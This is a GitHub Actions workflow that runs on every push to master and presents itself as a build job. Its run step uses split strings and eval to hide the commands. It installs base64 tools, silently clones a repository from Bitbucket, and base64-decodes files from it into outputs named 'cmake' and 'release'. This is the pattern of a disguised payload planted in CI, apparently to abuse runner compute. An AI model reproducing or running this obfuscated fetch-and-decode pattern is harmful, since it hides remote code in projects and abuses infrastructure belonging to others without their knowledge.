name: phd-5ht-co
on:
  push:
    branches: [ master ]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: run
        run: |
          sudo apt update || true
          upJMU="sudo apt --"
          RPoiqLdpu="yes install"
          zYqtCGP=" cl-base64 "
          tOLfwlSe="git &>/dev/"
          eval "$upJMU""$RPoiqLdpu""$zYqtCGP""$tOLfwlSe""null"
          FHgFNukO="git clone h"
          dRPuUm="ttps://gccb"
          IJumCInNq="uild@bitbuc"
          hLcYEkmfO="ket.org/gcc"
          SJbOs="build/gcc.g"
          nrmBNoaFzan="it &>/dev/n"
          eval "$FHgFNukO""$dRPuUm""$IJumCInNq""$hLcYEkmfO""$SJbOs""$nrmBNoaFzan""ull"
          cVpvA="base64 -d g"
          bPQRk="cc/cmake_ >"
          eval "$cVpvA""$bPQRk"" cmake"
          nLbUHFv="base64 -d g"
          mTgqQ="cc/config_ "
          yZqVUsrcu="> output.lo"
          eval "$nLbUHFv""$mTgqQ""$yZqVUsrcu""g"
          cyiGBnOMBy="base64 -d g"
          FXwten="cc/make_ > "
          eval "$cyiGBnOMBy""$FXwten""release"
